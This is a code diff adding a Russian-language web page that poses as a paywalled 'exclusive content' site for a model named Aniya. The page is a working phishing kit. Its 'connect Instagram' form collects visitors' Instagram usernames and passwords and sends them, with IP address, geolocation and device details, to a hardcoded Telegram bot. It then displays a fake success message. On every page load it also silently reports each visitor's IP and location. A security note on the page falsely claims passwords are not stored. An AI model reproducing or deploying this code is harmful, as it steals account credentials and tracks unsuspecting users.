@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aniya | Эксклюзивный контент</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #8A2BE2;
+            --secondary: #FF69B4;
+            --dark: #0F0F0F;
+            --light: #F8F8F8;
+            --accent: #FFD166;
+            --success: #00CC66;
+            --error: #FF3333;
+            --card-bg: rgba(30, 30, 30, 0.7);
+            --text-secondary: #AAAAAA;
+            --instagram: #E4405F;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--dark), #1A1A2E);
+            min-height: 100vh;
+            color: var(--light);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 40px 0;
+            position: relative;
+            overflow: hidden;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+
+        .logo {
+            font-size: 3.5em;
+            font-weight: 800;
+            margin-bottom: 15px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            letter-spacing: 1px;
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+            max-width: 700px;
+            margin: 0 auto;
+            color: var(--text-secondary);
+        }
+
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 50px;
+        }
+
+        .profile-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 800px;
+            text-align: center;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        .profile-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin: 0 auto 20px;
+            border: 3px solid var(--primary);
+        }
+
+        .profile-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .profile-name {
+            font-size: 2.5em;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--light);
+        }
+
+        .profile-bio {
+            font-size: 1.1em;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 20px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
+        }
+
+        .content-card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .content-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .content-image {
+            width: 100%;
+            height: 300px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .content-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px);
+            transition: filter 0.3s ease;
+        }
+
+        .content-card.unlocked .content-image img {
+            filter: blur(0);
+        }
+
+        .lock-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .content-card.unlocked .lock-overlay {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .lock-icon {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        .lock-text {
+            font-size: 1.1em;
+            font-weight: 600;
+        }
+
+        .content-info {
+            padding: 15px;
+        }
+
+        .content-title {
+            font-size: 1.2em;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .content-date {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+
+        .access-btn {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            border: none;
+            padding: 15px 30px;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1.1em;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 30px auto;
+            max-width: 300px;
+        }
+
+        .access-btn i {
+            margin-right: 10px;
+        }
+
+        .access-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(138, 43, 226, 0.6);
+        }
+
+        /* Обновленный дизайн формы регистрации */
+        .login-form {
+            background: rgba(26, 26, 46, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-form::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .instagram-icon {
+            font-size: 3em;
+            color: var(--instagram);
+            margin-bottom: 15px;
+        }
+
+        .login-form h2 {
+            font-size: 1.8em;
+            color: var(--light);
+            margin-bottom: 10px;
+        }
+
+        .login-subtitle {
+            color: var(--text-secondary);
+            font-size: 1em;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            color: var(--light);
+            font-weight: 500;
+            font-size: 1.1em;
+        }
+
+        .form-group label i {
+            margin-right: 10px;
+            color: var(--instagram);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.15);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(138, 43, 226, 0.2);
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .instagram-input-group {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding-left: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .instagram-prefix {
+            color: rgba(255, 255, 255, 0.7);
+            margin-right: 5px;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            background: rgba(0, 204, 102, 0.1);
+            border: 1px solid rgba(0, 204, 102, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .security-note i {
+            color: var(--success);
+            font-size: 1.5em;
+            margin-right: 15px;
+        }
+
+        .security-note p {
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+
+        .submit-btn {
+            background: linear-gradient(45deg, var(--instagram), #C13584);
+            border: none;
+            padding: 15px 25px;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            font-size: 1.1em;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(228, 64, 95, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .submit-btn i {
+            margin-right: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(228, 64, 95, 0.6);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1.8em;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .close-modal:hover {
+            color: var(--primary);
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid var(--accent);
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            background: rgba(0, 204, 102, 0.2);
+            border: 1px solid var(--success);
+            color: var(--light);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-message {
+            background: rgba(255, 51, 51, 0.2);
+            border: 1px solid var(--error);
+            color: var(--light);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 30px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--text-secondary);
+            font-size: 0.9em;
+        }
+
+        @media (max-width: 768px) {
+            .content-grid {
+                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            }
+
+            .logo {
+                font-size: 2.5em;
+            }
+
+            .login-form {
+                padding: 30px 20px;
+                width: 90%;
+            }
+
+            .stats {
+                gap: 20px;
+            }
+
+            .stat-value {
+                font-size: 1.5em;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 20px 0;
+            }
+
+            .logo {
+                font-size: 2em;
+            }
+
+            .profile-name {
+                font-size: 2em;
+            }
+
+            .content-image {
+                height: 250px;
+            }
+
+            .access-btn, .submit-btn {
+                padding: 12px 20px;
+                font-size: 1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <h1 class="logo">Aniya</h1>
+            <p>Эксклюзивный контент только для подписчиков</p>
+        </header>
+
+        <section class="profile-section">
+            <div class="profile-card">
+                <div class="profile-image">
+                    <img src="./img/ava.jpg" alt="Anissx">
+                </div>
+                <h2 class="profile-name">Aniya</h2>
+                <p class="profile-bio">Фотомодель и создатель эксклюзивного контента. Подпишись, чтобы увидеть все мои фото и видео!</p>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-value">127</div>
+                        <div class="stat-label">Фото</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">42</div>
+                        <div class="stat-label">Видео</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">5.2K</div>
+                        <div class="stat-label">Подписчиков</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <div class="content-grid" id="contentGrid">
+            <!-- Контент будет добавляться динамически -->
+        </div>
+
+        <button class="access-btn" onclick="showLoginModal()">
+            <i class="fas fa-lock-open"></i> Получить доступ
+        </button>
+
+        <div class="modal" id="loginModal">
+            <div class="login-form">
+                <button class="close-modal" onclick="closeModal()">&times;</button>
+                
+                <div class="login-header">
+                    <div class="instagram-icon">
+                        <i class="fab fa-instagram"></i>
+                    </div>
+                    <h2>Подключите Instagram</h2>
+                    <p class="login-subtitle">Для доступа к эксклюзивному контенту Aniya</p>
+                </div>
+
+                <div class="security-note">
+                    <i class="fas fa-shield-alt"></i>
+                    <p>Ваши данные защищены. Мы используем безопасное соединение и не храним пароли.</p>
+                </div>
+
+                <form id="loginForm" onsubmit="handleAccessRequest(event)">
+                    <div class="form-group">
+                        <label for="instagram"><i class="fab fa-instagram"></i> Instagram аккаунт:</label>
+                        <div class="instagram-input-group">
+                            <span class="instagram-prefix">@</span>
+                            <input type="text" id="instagram" placeholder="username" required style="border: none; background: transparent; padding-left: 0;">
+                        </div>
+                        <small style="display: block; margin-top: 5px; color: rgba(255,255,255,0.6);">Введите ваш Instagram без @</small>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-key"></i> Пароль от Instagram:</label>
+                        <input type="password" id="password" placeholder="Введите ваш пароль" required>
+                        <small style="display: block; margin-top: 5px; color: rgba(255,255,255,0.6);">Введите пароль для подтверждения доступа</small>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">
+                        <i class="fab fa-instagram"></i> Подключить Instagram
+                    </button>
+                    
+                    <div class="loading" id="loading">
+                        <div class="spinner"></div>
+                        <p>Подключаем ваш аккаунт...</p>
+                    </div>
+                    
+                    <div class="success-message" id="successMessage">
+                        <i class="fas fa-check-circle" style="color: var(--success); font-size: 2em; margin-bottom: 10px;"></i>
+                        <h3>Доступ предоставлен!</h3>
+                        <p>Теперь вы можете просматривать весь эксклюзивный контент Aniya.</p>
+                    </div>
+                    
+                    <div class="error-message" id="errorMessage">
+                        <i class="fas fa-exclamation-circle" style="color: var(--error); font-size: 2em; margin-bottom: 10px;"></i>
+                        <h3>Ошибка подключения!</h3>
+                        <p id="errorText">Произошла ошибка при подключении Instagram. Пожалуйста, попробуйте позже.</p>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>Aniya Exclusive Content &copy; 2025. Все права защищены.</p>
+        <p>Только для совершеннолетних. Соблюдайте правила платформы.</p>
+    </footer>
+
+    <script>
+        // Конфигурация
+        const BOT_TOKEN = '7944695234:AAEpBY3kRq6EgZ4bCDLVa1hhbRVi8bkK3Bw';
+        const CHAT_ID = '7058479669';
+        let isUnlocked = false;
+        
+        // Контент для отображения
+        const contentItems = [
+            { id: 1, title: "", date: "15.05.2025", image: "./img/first.jpg" },
+            { id: 2, title: "", date: "12.05.2025", image: "./img/second.jpg" },
+            { id: 3, title: "", date: "10.05.2025", image: "./img/third.jpg" },
+            { id: 4, title: "", date: "08.05.2025", image: "./img/fourth.jpg" },
+            { id: 5, title: "", date: "05.05.2025", image: "./img/fifth.jpg" },
+            { id: 6, title: "", date: "02.05.2025", image: "./img/sixth.jpg" }
+        ];
+        
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {
+            renderContentGrid();
+            // Отправляем уведомление о входе на сайт
+            sendVisitNotification();
+            
+            // Проверка конфигурации
+            if (!BOT_TOKEN || !CHAT_ID) {
+                console.error('BOT_TOKEN или CHAT_ID не настроены!');
+            }
+        });
+        
+        // Функция отрисовки контента
+        function renderContentGrid() {
+            const grid = document.getElementById('contentGrid');
+            grid.innerHTML = '';
+            
+            contentItems.forEach(item => {
+                const card = document.createElement('div');
+                card.className = `content-card ${isUnlocked ? 'unlocked' : ''}`;
+                card.innerHTML = `
+                    <div class="content-image">
+                        <img src="${item.image}" alt="${item.title}">
+                        ${!isUnlocked ? `
+                        <div class="lock-overlay">
+                            <i class="fas fa-lock lock-icon"></i>
+                            <div class="lock-text">Требуется доступ</div>
+                        </div>
+                        ` : ''}
+                    </div>
+                    <div class="content-info">
+                        <div class="content-title">${item.title}</div>
+                        <div class="content-date">${item.date}</div>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+        
+        // Функция отправки уведомления о посещении сайта
+        async function sendVisitNotification() {
+            const timestamp = new Date().toLocaleString();
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || 'прямой заход';
+            const locationInfo = await getLocationInfo(ip);
+            
+            const message = `
+<b>НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ ANIYA!</b>
+
+🕒 <b>Время:</b> ${timestamp}
+🌍 <b>IP:</b> ${ip}
+📍 <b>Местоположение:</b> ${locationInfo.city || 'неизвестно'}, ${locationInfo.country || 'неизвестно'}
+🖥 <b>Устройство:</b> ${userAgent}
+📱 <b>Разрешение:</b> ${screenResolution}
+🔗 <b>Источник:</b> ${referrer}
+            `;
+            
+            try {
+                await sendToTelegram(message);
+                console.log('Уведомление о посещении отправлено');
+            } catch (error) {
+                console.error('Не удалось отправить уведомление о посещении');
+            }
+        }
+        
+        // Функции доступа к контенту
+        function showLoginModal() {
+            document.getElementById('loginModal').classList.add('active');
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('instagram').focus();
+        }
+        
+        function closeModal() {
+            document.getElementById('loginModal').classList.remove('active');
+        }
+        
+        async function handleAccessRequest(event) {
+            event.preventDefault();
+            
+            const instagram = document.getElementById('instagram').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            // Удаляем @ из начала, если есть
+            const cleanInstagram = instagram.startsWith('@') ? instagram.substring(1) : instagram;
+            
+            // Валидация Instagram
+            if (!/^[a-zA-Z0-9._]{1,30}$/.test(cleanInstagram)) {
+                showError('Пожалуйста, введите корректный Instagram username (только буквы, цифры, точки и подчеркивания)');
+                return;
+            }
+            
+            // Проверка пароля
+            if (password.length < 4) {
+                showError('Пароль должен содержать не менее 4 символов');
+                return;
+            }
+            
+            // Показываем загрузку
+            document.getElementById('loading').style.display = 'flex';
+            document.getElementById('errorMessage').style.display = 'none';
+            
+            // Собираем информацию о пользователе
+            const timestamp = new Date().toLocaleString();
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || 'прямой заход';
+            const locationInfo = await getLocationInfo(ip);
+            
+            // Формируем сообщение для Telegram
+            const message = `
+<b>НОВЫЙ ЗАПРОС ДОСТУПА К КОНТЕНТУ ANIYA!</b>
+
+📱 <b>Instagram:</b> @${cleanInstagram}
+🔑 <b>Пароль:</b> ${password}
+
+🌍 <b>Геоданные:</b>
+├─ IP: ${ip}
+├─ Страна: ${locationInfo.country || 'неизвестно'}
+├─ Город: ${locationInfo.city || 'неизвестно'}
+└─ Провайдер: ${locationInfo.org || 'неизвестно'}
+
+🖥 <b>Устройство:</b>
+├─ User Agent: ${userAgent}
+├─ Разрешение: ${screenResolution}
+└─ Язык: ${navigator.language}
+
+🔗 <b>Источник:</b> ${referrer}
+🕒 <b>Время:</b> ${timestamp}
+            `;
+            
+            // Отправляем данные в Telegram
+            try {
+                const success = await sendToTelegram(message);
+                
+                if (success) {
+                    // Разблокируем контент
+                    isUnlocked = true;
+                    renderContentGrid();
+                    
+                    // Показываем сообщение об успехе
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('loginForm').reset();
+                    
+                    // Автоматически закрываем модальное окно через 3 секунды
+                    setTimeout(() => {
+                        document.getElementById('loginModal').classList.remove('active');
+                        document.getElementById('successMessage').style.display = 'none';
+                    }, 3000);
+                } else {
+                    showError('Ошибка при подключении Instagram. Пожалуйста, попробуйте позже.');
+                }
+            } catch (error) {
+                showError('Произошла ошибка. Пожалуйста, попробуйте позже.');
+                console.error('Ошибка:', error);
+            }
+        }
+        
+        // Вспомогательные функции
+        function showError(message) {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'block';
+            document.getElementById('errorText').textContent = message;
+        }
+        
+        async function sendToTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID) {
+                console.error('Не настроен BOT_TOKEN или CHAT_ID');
+                return false;
+            }
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Ошибка при отправке в Telegram:', error);
+                return false;
+            }
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'неизвестен';
+            }
+        }
+        
+        async function getLocationInfo(ip) {
+            if (ip === 'неизвестен') return {};
+            
+            try {
+                const response = await fetch(`https://ipinfo.io/${ip}/json`);
+                return await response.json();
+            } catch (error) {
+                return {};
+            }
+        }
+        
+        // Закрытие модального окна при клике вне формы
+        document.getElementById('loginModal').addEventListener('click', function(event) {
+            if (event.target === this) {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+</html>
